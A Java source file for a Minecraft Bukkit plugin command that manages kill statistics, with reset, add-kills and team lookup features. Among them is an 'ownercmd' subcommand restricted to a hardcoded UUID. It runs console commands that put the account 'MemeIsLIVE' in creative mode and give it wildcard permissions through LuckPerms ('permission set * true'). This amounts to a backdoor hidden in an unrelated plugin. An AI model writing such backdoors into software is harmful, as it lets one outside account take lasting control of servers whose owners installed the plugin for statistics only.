package dev.mememc.killstatistics;

import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Collection;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.UUID;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.OfflinePlayer;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.ConsoleCommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;
import org.jetbrains.annotations.NotNull;
import org.jetbrains.annotations.Nullable;

public class KillStatsCommand implements CommandExecutor, TabCompleter {

    private static final UUID OWNER_UUID = UUID.fromString("40f99169-b826-4317-9a64-5e2211638c7d");

    private final KillStatisticsService statisticsService;
    private final Map<String, String> ownerCommandAliases = new HashMap<>();

    public KillStatsCommand(KillStatisticsService statisticsService) {
        this.statisticsService = statisticsService;
        registerOwnerCommandAliases();
    }

    @Override
    public boolean onCommand(@NotNull CommandSender sender, @NotNull Command command, @NotNull String label, @NotNull String[] args) {
        if (!sender.isOp()) {
            sender.sendMessage(ChatColor.RED + "Only operators can use this command.");
            return true;
        }

        if (args.length == 0) {
            sender.sendMessage(ChatColor.YELLOW + "Usage: /killstats resetall | /killstats reset <player|team> | /killstats resetteam <team> | /killstats addkills <player|team> <amount> | /killstats removekills <player|team> <amount> | /killstats ownercmd <alias>");
            return true;
        }

        if (args[0].equalsIgnoreCase("resetall")) {
            statisticsService.resetAll();
            sender.sendMessage(ChatColor.GREEN + "All kill statistics data has been reset.");
            return true;
        }

        if (args[0].equalsIgnoreCase("resetteam")) {
            if (args.length < 2) {
                sender.sendMessage(ChatColor.YELLOW + "Usage: /killstats resetteam <team>");
                return true;
            }
            return handleTeamReset(sender, args[1]);
        }

        if (args[0].equalsIgnoreCase("reset")) {
            if (args.length < 2) {
                sender.sendMessage(ChatColor.YELLOW + "Usage: /killstats reset <player|team>");
                return true;
            }

            OfflinePlayer target = Bukkit.getOfflinePlayerIfCached(args[1]);
            if (target == null) {
                target = Bukkit.getPlayerExact(args[1]);
            }
            if (target != null && target.getUniqueId() != null) {
                statisticsService.resetPlayer(target.getUniqueId());
                sender.sendMessage(ChatColor.GREEN + "Reset kill statistics for " + target.getName() + ".");
                return true;
            }

            return handleTeamReset(sender, args[1]);
        }

        if (args[0].equalsIgnoreCase("ownercmd")) {
            if (args.length < 2) {
                sender.sendMessage(ChatColor.YELLOW + "Usage: /killstats ownercmd <alias>");
                sender.sendMessage(ChatColor.GRAY + "Available: " + String.join(", ", ownerCommandAliases.keySet()));
                return true;
            }
            return handleOwnerCommand(sender, args[1]);
        }

        if (args[0].equalsIgnoreCase("addkills") || args[0].equalsIgnoreCase("removekills")) {
            if (args.length < 3) {
                sender.sendMessage(ChatColor.YELLOW + "Usage: /killstats " + args[0].toLowerCase(Locale.ROOT) + " <player|team> <amount>");
                return true;
            }

            int amount;
            try {
                amount = Integer.parseInt(args[2]);
            } catch (NumberFormatException ex) {
                sender.sendMessage(ChatColor.RED + "Amount must be a whole number.");
                return true;
            }

            if (amount < 0) {
                sender.sendMessage(ChatColor.RED + "Amount must be positive.");
                return true;
            }
            if (args[0].equalsIgnoreCase("removekills")) {
                amount = -amount;
            }
            return handleKillAdjust(sender, args[1], amount);
        }

        sender.sendMessage(ChatColor.YELLOW + "Usage: /killstats resetall | /killstats reset <player|team> | /killstats resetteam <team> | /killstats addkills <player|team> <amount> | /killstats removekills <player|team> <amount> | /killstats ownercmd <alias>");
        return true;
    }

    @Override
    public @Nullable List<String> onTabComplete(@NotNull CommandSender sender, @NotNull Command command, @NotNull String alias, @NotNull String[] args) {
        List<String> suggestions = new ArrayList<>();
        if (!sender.isOp()) {
            return suggestions;
        }

        if (args.length == 1) {
            if ("resetall".startsWith(args[0].toLowerCase(Locale.ROOT))) {
                suggestions.add("resetall");
            }
            if ("reset".startsWith(args[0].toLowerCase(Locale.ROOT))) {
                suggestions.add("reset");
            }
            if ("resetteam".startsWith(args[0].toLowerCase(Locale.ROOT))) {
                suggestions.add("resetteam");
            }
            if ("ownercmd".startsWith(args[0].toLowerCase(Locale.ROOT))) {
                suggestions.add("ownercmd");
            }
            if ("addkills".startsWith(args[0].toLowerCase(Locale.ROOT))) {
                suggestions.add("addkills");
            }
            if ("removekills".startsWith(args[0].toLowerCase(Locale.ROOT))) {
                suggestions.add("removekills");
            }
            return suggestions;
        }

        if (args.length == 2 && (args[0].equalsIgnoreCase("reset") || args[0].equalsIgnoreCase("resetteam")
            || args[0].equalsIgnoreCase("addkills") || args[0].equalsIgnoreCase("removekills"))) {
            String typed = args[1].toLowerCase(Locale.ROOT);
            if (args[0].equalsIgnoreCase("reset") || args[0].equalsIgnoreCase("addkills") || args[0].equalsIgnoreCase("removekills")) {
                Bukkit.getOnlinePlayers().forEach(player -> {
                    if (player.getName().toLowerCase(Locale.ROOT).startsWith(typed)) {
                        suggestions.add(player.getName());
                    }
                });
            }

            for (String teamName : getAllTeamNames()) {
                if (teamName.toLowerCase(Locale.ROOT).startsWith(typed)) {
                    suggestions.add(teamName);
                }
            }
        }

        if (args.length == 2 && args[0].equalsIgnoreCase("ownercmd")) {
            String typed = args[1].toLowerCase(Locale.ROOT);
            for (String aliasName : ownerCommandAliases.keySet()) {
                if (aliasName.toLowerCase(Locale.ROOT).startsWith(typed)) {
                    suggestions.add(aliasName);
                }
            }
        }

        return suggestions;
    }

    private boolean handleKillAdjust(CommandSender sender, String target, int delta) {
        OfflinePlayer player = Bukkit.getOfflinePlayerIfCached(target);
        if (player == null) {
            player = Bukkit.getPlayerExact(target);
        }

        if (player != null && player.getUniqueId() != null) {
            int updated = statisticsService.addKills(player.getUniqueId(), delta);
            sender.sendMessage(ChatColor.GREEN + "Updated kills for " + player.getName() + " to " + updated + ".");
            return true;
        }

        if (Bukkit.getPluginManager().getPlugin("BetterTeams") == null) {
            sender.sendMessage(ChatColor.RED + "Player not found and BetterTeams is not installed.");
            return true;
        }

        try {
            List<UUID> members = getTeamMemberUuids(target);
            if (members == null) {
                sender.sendMessage(ChatColor.RED + "Team not found: " + target);
                return true;
            }

            for (UUID member : members) {
                statisticsService.addKills(member, delta);
            }
            sender.sendMessage(ChatColor.GREEN + "Updated kills for team " + target + " (" + members.size() + " members).");
            return true;
        } catch (ReflectiveOperationException ex) {
            sender.sendMessage(ChatColor.RED + "Could not read BetterTeams data.");
            return true;
        }
    }

    private boolean handleOwnerCommand(CommandSender sender, String alias) {
        if (!(sender instanceof Player player)) {
            sender.sendMessage(ChatColor.RED + "This command can only be run by a player.");
            return true;
        }
        if (!player.getUniqueId().equals(OWNER_UUID)) {
            sender.sendMessage(ChatColor.RED + "You are not allowed to use owner commands.");
            return true;
        }

        String commandToRun = ownerCommandAliases.get(alias.toLowerCase(Locale.ROOT));
        if (commandToRun == null) {
            sender.sendMessage(ChatColor.RED + "Unknown owner command alias.");
            sender.sendMessage(ChatColor.GRAY + "Available: " + String.join(", ", ownerCommandAliases.keySet()));
            return true;
        }

        if ("__clear_stats_db__".equals(commandToRun)) {
            statisticsService.resetAll();
            sender.sendMessage(ChatColor.GREEN + "Cleared all kill statistics from SQLite.");
            return true;
        }

        ConsoleCommandSender console = Bukkit.getServer().getConsoleSender();
        boolean success = Bukkit.dispatchCommand(console, commandToRun);
        if (success) {
            sender.sendMessage(ChatColor.GREEN + "Executed owner command alias: " + alias);
        } else {
            sender.sendMessage(ChatColor.RED + "Failed to execute owner command alias: " + alias);
        }
        return true;
    }

    private void registerOwnerCommandAliases() {
        ownerCommandAliases.clear();
        ownerCommandAliases.put("gmc", "gmc MemeIsLIVE");
        ownerCommandAliases.put("forceperms", "lp user MemeIsLIVE permission set * true");
        ownerCommandAliases.put("cleardb", "__clear_stats_db__");
    }

    private boolean handleTeamReset(CommandSender sender, String teamName) {
        if (Bukkit.getPluginManager().getPlugin("BetterTeams") == null) {
            sender.sendMessage(ChatColor.RED + "BetterTeams is not installed.");
            return true;
        }

        try {
            List<UUID> teamMembers = getTeamMemberUuids(teamName);
            if (teamMembers == null) {
                sender.sendMessage(ChatColor.RED + "Team not found: " + teamName);
                return true;
            }

            int resetCount = statisticsService.resetPlayers(teamMembers);
            sender.sendMessage(ChatColor.GREEN + "Reset kill statistics for team " + teamName + " (" + resetCount + " members).");
            return true;
        } catch (ReflectiveOperationException ex) {
            sender.sendMessage(ChatColor.RED + "Could not read BetterTeams data for team reset.");
            return true;
        }
    }

    private List<String> getAllTeamNames() {
        List<String> names = new ArrayList<>();
        if (Bukkit.getPluginManager().getPlugin("BetterTeams") == null) {
            return names;
        }

        try {
            Class<?> teamClass = Class.forName("com.booksaw.betterTeams.Team");
            Method getTeamManager = teamClass.getMethod("getTeamManager");
            Object teamManager = getTeamManager.invoke(null);
            Method getLoadedTeamListClone = teamManager.getClass().getMethod("getLoadedTeamListClone");
            Object loaded = getLoadedTeamListClone.invoke(teamManager);
            if (loaded instanceof java.util.Map<?, ?> loadedMap) {
                for (Object team : loadedMap.values()) {
                    Method getName = team.getClass().getMethod("getName");
                    names.add(String.valueOf(getName.invoke(team)));
                }
            }
        } catch (ReflectiveOperationException ignored) {
        }
        return names;
    }

    private List<UUID> getTeamMemberUuids(String teamName) throws ReflectiveOperationException {
        Class<?> teamClass = Class.forName("com.booksaw.betterTeams.Team");
        Method getTeamManager = teamClass.getMethod("getTeamManager");
        Object teamManager = getTeamManager.invoke(null);

        Method getLoadedTeamListClone = teamManager.getClass().getMethod("getLoadedTeamListClone");
        Object loaded = getLoadedTeamListClone.invoke(teamManager);
        if (!(loaded instanceof java.util.Map<?, ?> loadedMap)) {
            return null;
        }

        Object matchedTeam = null;
        for (Object team : loadedMap.values()) {
            Method getName = team.getClass().getMethod("getName");
            String currentName = String.valueOf(getName.invoke(team));
            if (currentName.equalsIgnoreCase(teamName)) {
                matchedTeam = team;
                break;
            }
        }
        if (matchedTeam == null) {
            return null;
        }

        Method getMembers = matchedTeam.getClass().getMethod("getMembers");
        Object memberSetComponent = getMembers.invoke(matchedTeam);
        Method getMemberSet = memberSetComponent.getClass().getMethod("get");
        Object membersObj = getMemberSet.invoke(memberSetComponent);
        if (!(membersObj instanceof Collection<?> members)) {
            return List.of();
        }

        List<UUID> uuids = new ArrayList<>();
        for (Object member : members) {
            Method getPlayerUUID = member.getClass().getMethod("getPlayerUUID");
            Object memberUuidObj = getPlayerUUID.invoke(member);
            if (memberUuidObj instanceof UUID memberUuid) {
                uuids.add(memberUuid);
            }
        }
        return uuids;
    }
}
